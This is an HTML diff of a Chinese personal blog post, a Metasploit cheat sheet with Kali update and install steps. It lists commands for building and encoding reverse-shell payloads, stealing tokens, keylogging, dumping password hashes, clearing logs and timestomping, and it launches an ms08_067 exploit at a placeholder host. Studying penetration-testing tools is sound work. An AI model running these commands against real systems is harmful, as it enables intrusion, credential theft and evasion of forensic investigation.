@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="future.zhangyan">
+
+
+
+    <meta name="description" content="未来可期">
+
+
+
+<title>Metasploit | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+	<!--动态线条背景-->
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body>
+    <div class="wrapper">
+        <header>
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet">
+	  <script type="text/javascript" src="C:/Users/zhangyan/Desktop/blog/themes/next/source/js"></script>
+
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">张艳&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+				<label for="switch_default" class="toggleBtn"></label>
+         
+				<div class="search bar7">
+					<form id="search-form"> <!-- 搜索框相关 -->
+						<input type="text" id="local-search-input" name="q" results="0" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off"/>
+						<button type="submit" class="search-form-submit"></button>
+						<i class="fa fa-times" onclick="resetSearch()"></i> <!-- 清空/重置搜索框 -->
+					</form>
+					<div class="ins-section-wrapper">
+						<div class="ins-section-container"></div>
+					</div>
+					<div id="local-search-result"></div> <!-- 搜索结果区 -->
+						<p class='no-result'>No results found </p> <!-- 无匹配时显示，注意请在 CSS 中设置默认隐藏 -->
+					</div>
+
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">张艳&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+            </div>
+
+
+        </div>
+    </nav>
+
+</header>
+<style type="text/css">
+	* {
+		box-sizing:border-box;
+	}
+	body {
+		margin:0;
+		padding:0;
+		background-image:url(ydrzimages/p3.jpg);
+		font-weight:500;
+		font-family:"Microsoft YaHei","宋体","Segoe UI","Lucida Grande",Helvetica,Arial,sans-serif,FreeSans,Arimo;
+	}
+	#container {
+		width:500px;
+		height:820px;
+		margin:0 auto;
+	}
+	div.search {
+		padding:10px 0;
+		margin-left:200px
+	}
+	form {
+		position:relative;
+		width:300px;
+		margin:0 auto;
+	}
+	input,button {
+		border:none;
+		outline:none;
+	}
+	input {
+		width:100%;
+		height:42px;
+		padding-left:13px;
+	}
+	button {
+		height:42px;
+		width:42px;
+		cursor:pointer;
+		position:absolute;
+	}
+	/*搜索框7*/
+		  
+	.bar7 form {
+		height:42px;
+	}
+	.bar7 input {
+		width:200px;
+		border-radius:42px;
+		border:2px solid #324B4E;
+		transition:.3s linear;
+		float:right;
+	}
+	.bar7 input:focus {
+		width:300px;
+	}
+	.bar7 button {
+		background:none;
+		top:-2px;
+		right:20px;
+	}
+	.bar7 button:before {
+		content:"点..";
+		font-family:FontAwesome;
+		color:#324b4e;
+	}
+	.no-result{
+		display:none
+	}
+</style>
+
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Metasploit</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">future.zhangyan</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 6, 2019&nbsp;&nbsp;19:59:54</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                            
+                        </span>
+						<span id="/2019/10/06/Metasploit/" class="leancloud-visitors view" data-flag-title="Metasploit">
+						  <em class="post-meta-item-text">Pageviews:</em>
+						  <i class="leancloud-visitors-count"></i>
+						</span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="msf的使用"><a href="#msf的使用" class="headerlink" title="msf的使用"></a>msf的使用</h2><p>Msfconsole:是一个一体化集中控制台，允许你访问到几乎所有的MSF框架选项**</p>
+<hr>
+<p>metasploit就是一个免费的漏洞框架，利用他人人都是黑客，使用者不需要任何编程基础就可以使用</p>
+<h3 id="check：检测漏洞是否存在"><a href="#check：检测漏洞是否存在" class="headerlink" title="check：检测漏洞是否存在"></a>check：检测漏洞是否存在</h3><h3 id="msf常用命令"><a href="#msf常用命令" class="headerlink" title="msf常用命令:"></a>msf常用命令:</h3><blockquote>
+<p>show exploits</p>
+<p>列出metasploit框架中的所有渗透攻击模块。</p>
+<p>show payloads</p>
+<p>列出metasploit框架中的所有攻击载荷。</p>
+<p>show auxiliary</p>
+<p>列出metasploit框架中的所有辅助攻击载荷。</p>
+<p>search name</p>
+<p>查找metasploit框架中所有的渗透攻击和其他模块。</p>
+<p>info</p>
+<p>展示出制定渗透攻击或模块的相关信息。</p>
+<p>use name</p>
+<p>装载一个渗透攻击或模块。</p>
+<p>LHOST</p>
+<p>你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。</p>
+<p>RHOST</p>
+<p>远程主机或是目标主机。</p>
+<p>set function</p>
+<p>设置特定的配置参数（EG：设置本地或远程主机参数）。</p>
+<p>setg function</p>
+<p>以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。</p>
+<p>show options</p>
+<p>列出某个渗透攻击或模块中所有的配置参数。</p>
+<p>show targets</p>
+<p>列出渗透攻击所有支持的目标平台。</p>
+<p>set target num</p>
+<p>指定你所知道的目标的操作系统以及补丁版本类型。</p>
+<p>set payload name</p>
+<p>指定想要使用的攻击载荷。</p>
+<p>show advanced</p>
+<p>列出所有高级配置选项。</p>
+<p>set autorunscript migrate -f.</p>
+<p>在渗透攻击完成后，将自动迁移到另一个进程。</p>
+<p>check</p>
+<p>检测目标是否选定渗透攻击存在相应的安全漏洞。</p>
+<p>exploit</p>
+<p>执行渗透攻击或模块来攻击目标。</p>
+<p>exploit -j</p>
+<p>在计划任务下进行渗透攻击（攻击将在后台进行）。</p>
+<p>exploit -z</p>
+<p>渗透攻击完成后不与回话进行交互。</p>
+<p>exploit -e encoder</p>
+<p>制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。</p>
+<p>exploit -h</p>
+<p>列出exploit命令的帮助信息。</p>
+<p>sessions -l</p>
+<p>列出可用的交互会话（在处理多个shell时使用）。</p>
+<p>sessions -l -v</p>
+<p>列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。</p>
+<p>sessions -s script</p>
+<p>在所有活跃的metasploit会话中运行一个特定的metasploit脚本。</p>
+<p>sessions -K</p>
+<p>杀死所有活跃的交互会话。</p>
+<p>sessions -c cmd</p>
+<p>在所有活跃的metasploit会话上执行一个命令。</p>
+<p>sessions -u sessionID</p>
+<p>升级一个普通的win32 shell到metasploit shell。</p>
+<p>db_create name</p>
+<p>创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。</p>
+<p>db_connect name</p>
+<p>创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。</p>
+<p>db_namp</p>
+<p>利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。</p>
+<p>db_autopwn -h</p>
+<p>展示出db_autopwn命令的帮助信息。</p>
+<p>db_autopwn -p -r -e</p>
+<p>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。</p>
+<p>db_destroy</p>
+<p>删除当前数据库。</p>
+<p>db_destroy user：passwd@host：port/database</p>
+<p>使用高级选项来删除数据库。</p>
+</blockquote>
+<h3 id="metasploit命令"><a href="#metasploit命令" class="headerlink" title="metasploit命令"></a><strong><em>metasploit命令</em></strong></h3><blockquote>
+<p>help</p>
+<p>打开meterpreter使用帮助。</p>
+<p>run scriptname</p>
+<p>运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。</p>
+<p>sysinfo</p>
+<p>列出受控主机的系统信息。</p>
+<p>ls</p>
+<p>列出目标主机的文件和文件夹信息。</p>
+<p>use priv</p>
+<p>加载特权提升扩展模块，来扩展metasploit库。</p>
+<p>ps</p>
+<p>显示所有运行的进程以及相关联的用户账户。</p>
+<p>migrate PID</p>
+<p>迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。</p>
+<p>use incognito</p>
+<p>加载incognito功能（用来盗窃目标主机的令牌或假冒用户）</p>
+<p>list_tokens -u</p>
+<p>列出目标主机用户的可用令牌。</p>
+<p>list_tokens -g</p>
+<p>列出目标主机用户组的可用令牌。</p>
+<p>impersonate_token DOMAIN_NAME\USERNAME</p>
+<p>假冒目标主机上的可用令牌。</p>
+<p>steal_token PID</p>
+<p>盗窃给定进程的可用令牌并进行令牌假冒。</p>
+<p>drop_token</p>
+<p>停止假冒当前令牌。</p>
+<p>getsystem</p>
+<p>通过各种攻击向量来提升系统用户权限。</p>
+<p>execute -f cmd.exe -i</p>
+<p>执行cmd.exe命令并进行交互。</p>
+<p>execute -f cmd.exe -i -t</p>
+<p>以所有可用令牌来执行cmd命令并隐藏该进程。</p>
+<p>rev2self</p>
+<p>回到控制目标主机的初始用户账户下。</p>
+<p>reg command</p>
+<p>在目标主机注册表中进行交互，创建，删除，查询等操作。</p>
+<p>setdesktop number</p>
+<p>切换到另一个用户界面（该功能基于那些用户已登录）。</p>
+<p>screenshot</p>
+<p>对目标主机的屏幕进行截图。</p>
+<p>upload file</p>
+<p>向目标主机上传文件。</p>
+<p>download file</p>
+<p>从目标主机下载文件。</p>
+<p>keyscan_start</p>
+<p>针对远程目标主机开启键盘记录功能。</p>
+<p>keyscan_dump</p>
+<p>存储目标主机上捕获的键盘记录。</p>
+<p>keyscan_stop</p>
+<p>停止针对目标主机的键盘记录。</p>
+<p>getprivs</p>
+<p>尽可能多的获取目标主机上的特权。</p>
+<p>uictl enable keyboard/mouse</p>
+<p>接管目标主机的键盘和鼠标。</p>
+<p>background</p>
+<p>将你当前的metasploit shell转为后台执行。</p>
+<p>hashdump</p>
+<p>导出目标主机中的口令哈希值。</p>
+<p>use sniffer</p>
+<p>加载嗅探模式。</p>
+<p>sniffer_interfaces</p>
+<p>列出目标主机所有开放的网络端口。</p>
+<p>sniffer_dump interfaceID pcapname</p>
+<p>在目标主机上启动嗅探。</p>
+<p>sniffer_start interfaceID packet-buffer</p>
+<p>在目标主机上针对特定范围的数据包缓冲区启动嗅探。</p>
+<p>sniffer_stats interfaceID</p>
+<p>获取正在实施嗅探网络接口的统计数据。</p>
+<p>sniffer_stop interfaceID</p>
+<p>停止嗅探。</p>
+<p>add_user username password -h ip</p>
+<p>在远程目标主机上添加一个用户。</p>
+<p>clearev</p>
+<p>清楚目标主机上的日志记录。</p>
+<p>timestomp</p>
+<p>修改文件属性，例如修改文件的创建时间（反取证调查）。</p>
+<p>reboot</p>
+<p>重启目标主机。</p>
+</blockquote>
+<h3 id="MSFpayload命令"><a href="#MSFpayload命令" class="headerlink" title="MSFpayload命令"></a><strong><em>MSFpayload命令</em></strong></h3><blockquote>
+<p>msfpayload -h</p>
+<p>msfpayload的帮助信息。</p>
+<p>msfpayload windows/meterpreter/bind_tcp O</p>
+<p>列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。</p>
+<p>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe</p>
+<p>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。</p>
+<p>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw</p>
+<p>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。</p>
+<p>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c</p>
+<p>创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。</p>
+<p>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java</p>
+<p>创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。</p>
+</blockquote>
+<h3 id="msfencode命令"><a href="#msfencode命令" class="headerlink" title="msfencode命令"></a><strong><em>msfencode命令</em></strong></h3><blockquote>
+<p>mefencode -h</p>
+<p>列出msfencode的帮助命令。</p>
+<p>msfencode -l</p>
+<p>列出所有可用的编码器。</p>
+<p>msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)</p>
+<p>显示编码缓冲区的格式。</p>
+<p>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe</p>
+<p>使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。</p>
+<p>msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe</p>
+<p>创建一个经过多种编码格式嵌套编码的攻击载荷。</p>
+<p>msfencode -i payload.raw BufferRegister=ESI -e x86/alpja_mixed -t c</p>
+<p>创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C语言格式输出。</p>
+</blockquote>
+<h3 id="MSFcli命令"><a href="#MSFcli命令" class="headerlink" title="MSFcli命令"></a><strong><em>MSFcli命令</em></strong></h3><blockquote>
+<p>msfcli | grep exploit</p>
+<p>仅列出渗透攻击模块。</p>
+<p>msfcli | grep exploit/windows</p>
+<p>仅列出与windows相关的渗透攻击模块。</p>
+<p>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E</p>
+<p>对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听</p>
+</blockquote>
+<h2 id="如何更新MSF"><a href="#如何更新MSF" class="headerlink" title="如何更新MSF"></a>如何更新MSF</h2><h3 id="1、🐱‍🐉直接在kali官网下载最新版本，一个星期更新一次。官方地址：http-www-kali-org-downloads"><a href="#1、🐱‍🐉直接在kali官网下载最新版本，一个星期更新一次。官方地址：http-www-kali-org-downloads" class="headerlink" title="1、🐱‍🐉直接在kali官网下载最新版本，一个星期更新一次。官方地址：http://www.kali.org/downloads/"></a>1、🐱‍🐉直接在kali官网下载最新版本，一个星期更新一次。官方地址：<a target="_blank" rel="noopener" href="http://www.kali.org/downloads/">http://www.kali.org/downloads/</a></h3><p>kail下载地址：</p>
+<p>[<strong><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1c05BnlI">https://pan.baidu.com/s/1c05BnlI</a></strong></p>
+<p><a target="_blank" rel="noopener" href="http://cdimage.kali.org/kali-weekly/">http://cdimage.kali.org/kali-weekly/</a></p>
+<p><a target="_blank" rel="noopener" href="http://sourceforge.net/projects/Metasploitable/files/Metasploitable2/">http://sourceforge.net/projects/Metasploitable/files/Metasploitable2/</a></p>
+<p>注意: 测试系统下载下来后是zip格式的。解压后使用VM打开。如果是VMware的，直接打开用VMware打开Metasploitable.vmx文件即可。Metasploitable系统的默认账号和密码是msfadmin:msfadmin如果你想了解更多关于Metasploitable的信息，你可以去下面这个网站：<a target="_blank" rel="noopener" href="https://community.rapid7.com/docs/DOC-1875">https://community.rapid7.com/docs/DOC-1875</a></p>
+<h3 id="2🐱‍🚀、加入更新源"><a href="#2🐱‍🚀、加入更新源" class="headerlink" title="2🐱‍🚀、加入更新源"></a>2🐱‍🚀、加入更新源</h3><p>一、替换yum源，把kail原有更新源#号注释掉</p>
+<p><img src="//upload-images.jianshu.io/upload_images/21549033-1ab4263a437bd7db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p>
+<p>root@kali:~#vi /etc/apt/sources.list（这是修改更新源）</p>
+<p>（更新源全国各地都不一样，因为当地的电信，移动防火墙会拦截）</p>
+<p>kali-rolling版本：（中科大的就够用了，个人按需吧）</p>
+<p># kali官方源</p>
+<p>deb <a target="_blank" rel="noopener" href="http://http.kali.org/">http://http.kali.org/</a> kali-rolling main non-free contrib</p>
+<p>deb-src <a target="_blank" rel="noopener" href="http://http.kali.org/">http://http.kali.org/</a> kali-rolling main non-free contrib</p>
+<p>#中科大源</p>
+<p>deb <a target="_blank" rel="noopener" href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
+<p>deb-src <a target="_blank" rel="noopener" href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
+<p><img src="//upload-images.jianshu.io/upload_images/21549033-56458e7248e32cb3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1069/format/webp" alt="img"></p>
+<p>shift+：wq保存退出</p>
+<h3 id="添加数字签名"><a href="#添加数字签名" class="headerlink" title="添加数字签名"></a>添加数字签名</h3><p>wget archive.kali.org/archive-key.asc   //下载签名</p>
+<p>apt-key add archive-key.asc   //安装签名</p>
+<p>注：如果添加数字签名还提示无法安装可删除原有msf</p>
+<p>root@kali:~# apt remove metasploit-framework</p>
+<p><strong>注：</strong>卸载过程中无法获得锁/var/cache/apt/archives/lock - open (11:资源暂时不可用)</p>
+<p>无法对目录/var/cache/apt/archives/加锁</p>
+<p>root@kali:~# sudo rm /var/cache/apt/archives/lock  //进行强制解锁</p>
+<p>root@kali:~# sudo rm /var/cache/apt/archives/ </p>
+<hr>
+<h2 id="安装msf框架"><a href="#安装msf框架" class="headerlink" title="安装msf框架"></a><strong>安装msf框架</strong></h2><p><strong>oot@bogon:~# apt-get update</strong></p>
+<p>root@kali:~# apt-get  install metasploit-framework//安装msf框架</p>
+<p><img src="//upload-images.jianshu.io/upload_images/21549033-cf4550c3ebbdb454.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/811/format/webp" alt="img"></p>
+<p>选择yes说明更新成功</p>
+<p>root@kali:~#msfconsole   //发现有提示数据库未启动，退出msf启动数据库</p>
+<p>root@kali:~# systemctl start postgresql  //启动数据库</p>
+<p>root@kali:~# systemctl enable postgresql //允许开机自启动</p>
+<p>root@kali:~# msfdb init //构建数据库缓存</p>
+<p>root@kali:~#msfconsole</p>
+<hr>
+<p>注意：如果更新完msf出现才下问题</p>
+<p>root@kaliew:~# msfconsole</p>
+<p>[*] Bundler failed to load and returned this error:</p>
+<p>   ‘cannot load such file – bundler/setup’</p>
+<p>[*] You may need to uninstall or upgrade bundler</p>
+<p>解决方法：</p>
+<p>root@kaliew:~# sudo gem install bundler</p>
+<p>root@kaliew:~# bundle update celluloid</p>
+<h2 id="MSF之meterpreter后期攻击使用方法"><a href="#MSF之meterpreter后期攻击使用方法" class="headerlink" title="MSF之meterpreter后期攻击使用方法"></a>MSF之meterpreter后期攻击使用方法</h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/nb/46943313">https://www.jianshu.com/nb/46943313</a></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>future.zhangyan</span>
+                    </p>
+                
+				
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://zhangyanlady.github.io/2019/10/06/Metasploit/">https://zhangyanlady.github.io/2019/10/06/Metasploit/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>The future can be expected, the world is worth it.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># 网络安全</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/10/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E4%B8%8B%E8%BD%BD/">文件上传、下载</a>
+            
+            
+            <a class="next" rel="next" href="/2019/09/30/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
+            
+        </section>
+			</br>
+			
+
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© future.zhangyan | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+	<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+    </div>
+
+
+	
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
